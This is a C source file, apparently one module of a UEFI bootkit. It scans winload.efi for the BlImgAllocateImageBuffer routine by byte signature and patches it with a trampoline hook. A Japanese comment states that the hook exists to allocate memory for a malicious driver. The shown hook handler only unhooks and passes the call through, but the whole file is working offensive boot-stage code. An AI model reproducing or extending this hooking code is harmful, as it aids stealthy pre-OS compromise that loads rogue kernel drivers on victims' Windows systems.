#include "BlImgAllocateImageBuffer.h"
#include "Trampoline.h"
#include "Serial.h"

#include <efilib.h>

// BlImgAllocateImageBufferの型
typedef EFI_STATUS(EFIAPI* BL_IMG_ALLOCATE_IMAGE_BUFFER)(VOID**, UINTN, UINT32, UINT32, VOID*, UINT32);
// BlImgAllocateImageBufferの先頭アドレス
BL_IMG_ALLOCATE_IMAGE_BUFFER BlImgAllocateImageBuffer;

// BlImgAllocateImageBufferの元命令を保持
CHAR8 OriginalBlImgAllocateImageBuffer[TRAMPOLINE_SIZE] = { 0 };

// BlImgAllocateImageBufferのシグネチャ
// 48 89 5C 24 18 55 56 57  41 54 41 55 41 56 41 57
// 48 8B EC 48 83 EC 50 4C  8B 39 4C 8D 62 FF 48 83
CONST CHAR8 SigBlImgAllocateImageBuffer[] = {
    "\x48\x89\x5C\x24\x18\x55\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57"
    "\x48\x8B\xEC\x48\x83\xEC\x50\x4C\x8B\x39\x4C\x8D\x62\xFF\x48\x83"
};

CONST CHAR8 MaskBlImgAllocateImageBuffer[] = {
    "xxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxx"
};

EFI_STATUS EFIAPI HookedBlImgAllocateImageBuffer(VOID** ImageBuffer, UINTN ImageSize, UINT32 MemoryType, UINT32 Attributes, VOID* Unused, UINT32 Flags)
{
    SerialPrint(L"===== HookedBlImgAllocateImageBuffer =====\r\n");

    do
    {
        // winload.efi!BlImgAllocateImageBufferをアンフックする
        TrampolineUnhook(BlImgAllocateImageBuffer, OriginalBlImgAllocateImageBuffer, FALSE);
    } while (FALSE);

    return BlImgAllocateImageBuffer(ImageBuffer, ImageSize, MemoryType, Attributes, Unused, Flags);
}

EFI_STATUS EFIAPI SetupBlImgAllocateImageBuffer(VOID* WinloadBase)
{
    EFI_STATUS Status = EFI_NOT_FOUND;

    VOID* BaseBlImgAllocateImageBuffer = NULL;

    do
    {
        Print(L"[+] Find BlImgAllocateImageBuffer in winload.efi\r\n");

        // winload.efi!BlImgAllocateImageBufferの先頭アドレスを探す
        BaseBlImgAllocateImageBuffer = FindPatternFromSections(WinloadBase, SigBlImgAllocateImageBuffer, MaskBlImgAllocateImageBuffer);
        if (BaseBlImgAllocateImageBuffer == NULL)
        {
            Print(L"[-] Failed to find BlImgAllocateImageBuffer\r\n");
            break;
        }
        Print(L"[+] BlImgAllocateImageBuffer is 0x%llx\r\n", BaseBlImgAllocateImageBuffer);

        // winload.efi!BlImgAllocateImageBufferをフック
        // 悪意のあるドライバのメモリバッファを確保する
        BlImgAllocateImageBuffer = TrampolineHook(HookedBlImgAllocateImageBuffer, BaseBlImgAllocateImageBuffer, OriginalBlImgAllocateImageBuffer, TRUE);
        if (BlImgAllocateImageBuffer == NULL)
        {
            Print(L"[-] Failed to hook BlImgAllocateImageBuffer\r\n");
            break;
        }
        Print(L"[+] Hooked BlImgAllocateImageBuffer\r\n");

        Status = EFI_SUCCESS;
    } while (FALSE);

    return Status;
}
